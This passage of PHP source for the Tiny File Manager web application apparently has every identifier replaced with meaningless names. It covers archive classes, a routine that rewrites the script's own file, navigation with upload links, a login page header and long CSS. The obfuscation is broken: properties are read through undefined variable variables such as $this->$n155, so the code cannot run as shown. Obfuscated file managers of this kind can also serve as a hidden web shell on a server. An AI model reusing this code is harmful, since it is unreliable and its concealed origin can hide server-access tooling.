     */ private function i31($mb6){if(is_file($mb6)){return $this->$e14f->e153($mb6);}elseif(is_dir($mb6)){return $this->t32($mb6);}return false;}/**
     * Add folder recursively
     * @param string $path
     * @return bool
     */ private function t32($m70){if(!$this->$e14f->o154($m70)){return false;}$td0=scandir($m70);if(is_array($td0)){foreach($td0 as $u64){if($u64!='.'&&$u64!='..'){if(is_dir($m70.'/'.$u64)){if(!$this->t32($m70.'/'.$u64)){return false;}}elseif(is_file($m70.'/'.$u64)){if(!$this->$e14f->e153($m70.'/'.$u64)){return false;}}}}return true;}return false;}}/**
 * Class to work with Tar files (using PharData)
 */ class dc6{private $pc5;public function k2e(){$this->$n155=null;}/**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */ public function d2f($mb6,$yad){$this->$n155=new rcc($mb6);if(is_array($yad)){foreach($yad as $pae){$pae=r13($pae);if(!$this->i31($pae)){return false;}}return true;}else{if($this->i31($yad)){return true;}return false;}}/**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */ public function u30($mb6,$m70){$k84=$this->$n155->m151($mb6);if($k84!==true){return false;}if($this->$n155->pcd($m70)){return true;}return false;}/**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */ private function i31($mb6){if(is_file($mb6)){try{$this->$n155->e153($mb6);return true;}catch(Exception $f7d){return false;}}elseif(is_dir($mb6)){return $this->t32($mb6);}return false;}/**
     * Add folder recursively
     * @param string $path
     * @return bool
     */ private function t32($m70){$td0=scandir($m70);if(is_array($td0)){foreach($td0 as $u64){if($u64!='.'&&$u64!='..'){if(is_dir($m70.'/'.$u64)){if(!$this->t32($m70.'/'.$u64)){return false;}}elseif(is_file($m70.'/'.$u64)){try{$this->$n155->e153($m70.'/'.$u64);}catch(Exception $f7d){return false;}}}}return true;}return false;}}/**
 * Save Configuration
 */ class v5a{var $j156;function k2e(){global $w45,$y46,$s3b;$p157=$y46.$_SERVER["PHP_SELF"];$this->$v5c=array('lang'=>'en','error_reporting'=>true,'show_hidden'=>true);$j156=false;if(strlen($s3b)){$j156=m21(json_decode($s3b));}else{$n63='Tiny File Manager<br>Error: Cannot load configuration';if(substr($p157,-1)=='/'){$p157=rtrim($p157,'/');$n63.='<br>';$n63.='<br>Seems like you have a trailing slash on the URL.';$n63.='<br>Try this link: <a href="'.$p157.'">'.$p157.'</a>';}die($n63);}if(is_array($j156)&&count($j156))$this->$v5c=$j156;else $this->y33();}function y33(){$f158=__FILE__;$d159='$CONFIG';$u15a=var_export(json_encode($this->$v5c),true);$n15b="<?php".chr(13).chr(10)."//Default Configuration".chr(13).chr(10)."$d159 = $u15a;".chr(13).chr(10);if(is_writable($f158)){$u15c=file($f158);if($w15d=@fopen($f158,"w")){@fputs($w15d,$n15b,strlen($n15b));for($vd4=3;$vd4<count($u15c);$vd4++){@fputs($w15d,$u15c[$vd4],strlen($u15c[$vd4]));}@fclose($w15d);}}}}/**
 * Show nav block
 * @param string $path
 */ function v34($m70){global $b5b,$q50,$ff2;$m15e=$q50?'fixed-top':'';$n15f=p2d();$n15f.=" navbar-light";if(FM_THEME=="dark"){$n15f.=" navbar-dark";}else{$n15f.=" bg-white";}?>
    <nav class="navbar navbar-expand-lg <?php echo $n15f;?> mb-4 main-nav <?php echo $m15e ?>">
        <a class="navbar-brand"> <?php echo c3a('AppTitle')?> </a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php $m70=r13($m70);$y46="<a href='?p='><i class='fa fa-home' aria-hidden='true' title='".FM_ROOT_PATH."'></i></a>";$p160='<i class="bread-crumb"> / </i>';if($m70!=''){$x161=explode('/',$m70);$o162=count($x161);$f115=array();$gcf='';for($g163=0;$g163<$o162;$g163++){$gcf=trim($gcf.'/'.$x161[$g163],'/');$l164=urlencode($gcf);$f115[]="<a href='?p={$l164}'>".g1c(s20($x161[$g163]))."</a>";}$y46.=$p160.r5($p160,$f115);}echo '<div class="col-xs-6 col-sm-5">'.$y46.$ff2.'</div>';?>

            <div class="col-xs-6 col-sm-7">
                <ul class="navbar-nav justify-content-end <?php echo p2d();?>">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="<?php echo c3a('Search')?>" aria-label="<?php echo c3a('Search')?>" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                            <div class="input-group-append btn-group">
                                <span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                  <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="<?php echo $a165=$m70?$m70:'.';?>" id="js-search-modal" data-bs-toggle="modal" data-bs-target="#searchModal"><?php echo c3a('Advanced Search')?></a>
                                  </div>
                            </div>
                        </div>
                    </li>
                    <?php if(!FM_READONLY):?>
                    <li class="nav-item">
                        <a title="<?php echo c3a('Upload')?>" class="nav-link" href="?p=<?php echo urlencode(FM_PATH)?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php echo c3a('Upload')?></a>
                    </li>
                    <li class="nav-item">
                        <a title="<?php echo c3a('NewItem')?>" class="nav-link" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php echo c3a('NewItem')?></a>
                    </li>
                    <?php endif;?>
                    <?php if(FM_USE_AUTH):?>
                    <li class="nav-item avatar dropdown">
                        <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="fa fa-user-circle"></i> <?php if(isset($_SESSION[FM_SESSION_ID]['logged'])){echo $_SESSION[FM_SESSION_ID]['logged'];}?></a>
                        <div class="dropdown-menu text-small shadow <?php echo p2d();?>" aria-labelledby="navbarDropdownMenuLink-5">
                            <?php if(!FM_READONLY):?>
                            <a title="<?php echo c3a('Settings')?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH)?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo c3a('Settings')?></a>
                            <?php endif ?>
                            <a title="<?php echo c3a('Help')?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH)?>&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php echo c3a('Help')?></a>
                            <a title="<?php echo c3a('Logout')?>" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php echo c3a('Logout')?></a>
                        </div>
                    </li>
                    <?php else:?>
                        <?php if(!FM_READONLY):?>
                            <li class="nav-item">
                                <a title="<?php echo c3a('Settings')?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH)?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo c3a('Settings')?></a>
                            </li>
                        <?php endif;?>
                    <?php endif;?>
                </ul>
            </div>
        </div>
    </nav>
    <?php }/**
 * Show alert message from session
 */ function j35(){if(isset($_SESSION[FM_SESSION_ID]['message'])){$e166=isset($_SESSION[FM_SESSION_ID]['status'])?$_SESSION[FM_SESSION_ID]['status']:'ok';echo '<p class="message '.$e166.'">'.$_SESSION[FM_SESSION_ID]['message'].'</p>';unset($_SESSION[FM_SESSION_ID]['message']);unset($_SESSION[FM_SESSION_ID]['status']);}}/**
 * Show page header in Login Form
 */ function x36(){$f167='20160315';header("Content-Type: text/html; charset=utf-8");header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");header("Pragma: no-cache");global $b5b,$y46,$q4d;?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
    <meta name="author" content="CCP Programmers">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($q4d){echo '<link rel="icon" href="'.g1c($q4d).'" type="image/png">';}?>
    <title><?php echo g1c(APP_TITLE)?></title>
    <?php m7('pre-jsdelivr');?>
    <?php m7('css-bootstrap');?>
    <style>
        body.fm-login-page{ background-color:#f7f9fb;font-size:14px;background-color:#f7f9fb;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");}
        .fm-login-page .brand{ width:121px;overflow:hidden;margin:0 auto;position:relative;z-index:1}
        .fm-login-page .brand img{ width:100%}
        .fm-login-page .card-wrapper{ width:360px;margin-top:10%;margin-left:auto;margin-right:auto;}
        .fm-login-page .card{ border-color:transparent;box-shadow:0 4px 8px rgba(0,0,0,.05)}
        .fm-login-page .card-title{ margin-bottom:1.5rem;font-size:24px;font-weight:400;}
        .fm-login-page .form-control{ border-width:2.3px}
        .fm-login-page .form-group label{ width:100%}
        .fm-login-page .btn.btn-block{ padding:12px 10px}
        .fm-login-page .footer{ margin:40px 0;color:#888;text-align:center}
        @media screen and (max-width:425px){
            .fm-login-page .card-wrapper{ width:90%;margin:0 auto;margin-top:10%;}
        }
        @media screen and (max-width:320px){
            .fm-login-page .card.fat{ padding:0}
            .fm-login-page .card.fat .card-body{ padding:15px}
        }
        .message{ padding:4px 7px;border:1px solid #ddd;background-color:#fff}
        .message.ok{ border-color:green;color:green}
        .message.error{ border-color:red;color:red}
        .message.alert{ border-color:orange;color:orange}
        body.fm-login-page.theme-dark {background-color: #2f2a2a;}
        .theme-dark svg g, .theme-dark svg path {fill: #ffffff; }
    </style>
</head>
<body class="fm-login-page <?php echo(FM_THEME=="dark")?'theme-dark':'';?>">
<div id="wrapper" class="container-fluid">

    <?php }/**
     * Show page footer in Login Form
     */ function w37(){?>
</div>
<?php m7('js-jquery');?>
<?php m7('js-bootstrap');?>
</body>
</html>
<?php }/**
 * Show Header after login
 */ function i38(){$f167='20160315';header("Content-Type: text/html; charset=utf-8");header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");header("Pragma: no-cache");global $b5b,$y46,$q50,$q4d;$m15e=$q50?'navbar-fixed':'navbar-normal';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
    <meta name="author" content="CCP Programmers">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($q4d){echo '<link rel="icon" href="'.g1c($q4d).'" type="image/png">';}?>
    <title><?php echo g1c(APP_TITLE)?></title>
    <?php m7('pre-jsdelivr');?>
    <?php m7('pre-cloudflare');?>
    <?php m7('css-bootstrap');?>
    <?php m7('css-font-awesome');?>
    <?php if(FM_USE_HIGHLIGHTJS&&isset($_GET['view'])):?>
    <?php m7('css-highlightjs');?>
    <?php endif;?>
    <script type="text/javascript">window.csrf = '<?php echo $_SESSION['token'];?>';</script>
    <style>
        html { -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; height: 100%; scroll-behavior: smooth;}
        *,*::before,*::after { box-sizing: border-box;}
        body { font-size:15px; color:#222;background:#F7F7F7; }
        body.navbar-fixed { margin-top:55px; }
        a, a:hover, a:visited, a:focus { text-decoration:none !important; }
        .filename, td, th { white-space:nowrap  }
        .navbar-brand { font-weight:bold; }
        .nav-item.avatar a { cursor:pointer;text-transform:capitalize; }
        .nav-item.avatar a > i { font-size:15px; }
        .nav-item.avatar .dropdown-menu a { font-size:13px; }
        #search-addon { font-size:12px;border-right-width:0; }
        .brl-0 { background:transparent;border-left:0; border-top-left-radius: 0; border-bottom-left-radius: 0; }
        .brr-0 { border-top-right-radius: 0; border-bottom-right-radius: 0; }
        .bread-crumb { color:#cccccc;font-style:normal; }
        #main-table { transition: transform .25s cubic-bezier(0.4, 0.5, 0, 1),width 0s .25s;}
        #main-table .filename a { color:#222222; }
        .table td, .table th { vertical-align:middle !important; }
        .table .custom-checkbox-td .custom-control.custom-checkbox, .table .custom-checkbox-header .custom-control.custom-checkbox { min-width:18px; display: flex;align-items: center; justify-content: center; }
        .table-sm td, .table-sm th { padding:.4rem; }
        .table-bordered td, .table-bordered th { border:1px solid #f1f1f1; }
        .hidden { display:none  }
        pre.with-hljs { padding:0; overflow: hidden;  }
        pre.with-hljs code { margin:0;border:0;overflow:scroll;  }
        code.maxheight, pre.maxheight { max-height:512px  }
        .fa.fa-caret-right { font-size:1.2em;margin:0 4px;vertical-align:middle;color:#ececec  }
        .fa.fa-home { font-size:1.3em;vertical-align:bottom  }
        .path { margin-bottom:10px  }
        form.dropzone { min-height:200px;border:2px dashed #007bff;line-height:6rem; }
        .right { text-align:right  }
        .center, .close, .login-form, .preview-img-container { text-align:center  }
        .message { padding:4px 7px;border:1px solid #ddd;background-color:#fff  }
        .message.ok { border-color:green;color:green  }
        .message.error { border-color:red;color:red  }
        .message.alert { border-color:orange;color:orange  }
        .preview-img { max-width:100%;max-height:80vh;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC);cursor:zoom-in }
        input#preview-img-zoomCheck[type=checkbox] { display:none }
        input#preview-img-zoomCheck[type=checkbox]:checked ~ label > img { max-width:none;max-height:none;cursor:zoom-out }
        .inline-actions > a > i { font-size:1em;margin-left:5px;background:#3785c1;color:#fff;padding:3px 4px;border-radius:3px; }
        .preview-video { position:relative;max-width:100%;height:0;padding-bottom:62.5%;margin-bottom:10px  }
        .preview-video video { position:absolute;width:100%;height:100%;left:0;top:0;background:#000  }
        .compact-table { border:0;width:auto  }
        .compact-table td, .compact-table th { width:100px;border:0;text-align:center  }
        .compact-table tr:hover td { background-color:#fff  }
        .filename { max-width:420px;overflow:hidden;text-overflow:ellipsis  }
        .break-word { word-wrap:break-word;margin-left:30px  }
        .break-word.float-left a { color:#7d7d7d  }
        .break-word + .float-right { padding-right:30px;position:relative  }
        .break-word + .float-right > a { color:#7d7d7d;font-size:1.2em;margin-right:4px  }
        #editor { position:absolute;right:15px;top:100px;bottom:15px;left:15px  }
        @media (max-width:481px) {
            #editor { top:150px; }
        }
        #normal-editor { border-radius:3px;border-width:2px;padding:10px;outline:none; }
        .btn-2 { padding:4px 10px;font-size:small; }
        li.file:before,li.folder:before { font:normal normal normal 14px/1 FontAwesome;content:"\f016";margin-right:5px }
        li.folder:before { content:"\f114" }
        i.fa.fa-folder-o { color:#0157b3 }
        i.fa.fa-picture-o { color:#26b99a }
        i.fa.fa-file-archive-o { color:#da7d7d }
        .btn-2 i.fa.fa-file-archive-o { color:inherit }
        i.fa.fa-css3 { color:#f36fa0 }
        i.fa.fa-file-code-o { color:#007bff }
        i.fa.fa-code { color:#cc4b4c }
        i.fa.fa-file-text-o { color:#0096e6 }
        i.fa.fa-html5 { color:#d75e72 }
        i.fa.fa-file-excel-o { color:#09c55d }
        i.fa.fa-file-powerpoint-o { color:#f6712e }
        i.go-back { font-size:1.2em;color:#007bff; }
        .main-nav { padding:0.2rem 1rem;box-shadow:0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)  }
        .dataTables_filter { display:none; }
        table.dataTable thead .sorting { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC'); }
        table.dataTable thead .sorting_asc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg=='); }
        table.dataTable thead .sorting_desc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII='); }
        table.dataTable thead tr:first-child th.custom-checkbox-header:first-child { background-image:none; }
        .footer-action li { margin-bottom:10px; }
        .app-v-title { font-size:24px;font-weight:300;letter-spacing:-.5px;text-transform:uppercase; }
        hr.custom-hr { border-top:1px dashed #8c8b8b;border-bottom:1px dashed #fff; }
        #snackbar { visibility:hidden;min-width:250px;margin-left:-125px;background-color:#333;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:1;left:50%;bottom:30px;font-size:17px; }
        #snackbar.show { visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 2.5s;animation:fadein 0.5s, fadeout 0.5s 2.5s; }
        @-webkit-keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @-webkit-keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        @keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        #main-table span.badge { border-bottom:2px solid #f8f9fa }
        #main-table span.badge:nth-child(1) { border-color:#df4227 }
        #main-table span.badge:nth-child(2) { border-color:#f8b600 }
        #main-table span.badge:nth-child(3) { border-color:#00bd60 }
        #main-table span.badge:nth-child(4) { border-color:#4581ff }
        #main-table span.badge:nth-child(5) { border-color:#ac68fc }
        #main-table span.badge:nth-child(6) { border-color:#45c3d2 }
        @media only screen and (min-device-width:768px) and (max-device-width:1024px) and (orientation:landscape) and (-webkit-min-device-pixel-ratio:2) { .navbar-collapse .col-xs-6 { padding:0; }
        }
        .btn.active.focus,.btn.active:focus,.btn.focus,.btn.focus:active,.btn:active:focus,.btn:focus { outline:0!important;outline-offset:0!important;background-image:none!important;-webkit-box-shadow:none!important;box-shadow:none!important }
        .lds-facebook { display:none;position:relative;width:64px;height:64px }
        .lds-facebook div,.lds-facebook.show-me { display:inline-block }
        .lds-facebook div { position:absolute;left:6px;width:13px;background:#007bff;animation:lds-facebook 1.2s cubic-bezier(0,.5,.5,1) infinite }
        .lds-facebook div:nth-child(1) { left:6px;animation-delay:-.24s }
        .lds-facebook div:nth-child(2) { left:26px;animation-delay:-.12s }
        .lds-facebook div:nth-child(3) { left:45px;animation-delay:0s }
        @keyframes lds-facebook { 0% { top:6px;height:51px }
        100%,50% { top:19px;height:26px }
        }
        ul#search-wrapper { padding-left: 0;border: 1px solid #ecececcc; } ul#search-wrapper li { list-style: none; padding: 5px;border-bottom: 1px solid #ecececcc; }
        ul#search-wrapper li:nth-child(odd){ background: #f9f9f9cc;}
        .c-preview-img { max-width: 300px; }
        .border-radius-0 { border-radius: 0; }
        .float-right { float: right; }
        .table-hover>tbody>tr:hover>td:first-child { border-left: 1px solid #1b77fd; }
        #main-table tr.even { background-color: #F8F9Fa; }
        .filename>a>i {margin-right: 3px;}
    </style>
    <?php if(FM_THEME=="dark"):?>
        <style>
            :root {
                --bs-bg-opacity: 1;
                --bg-color: #f3daa6;
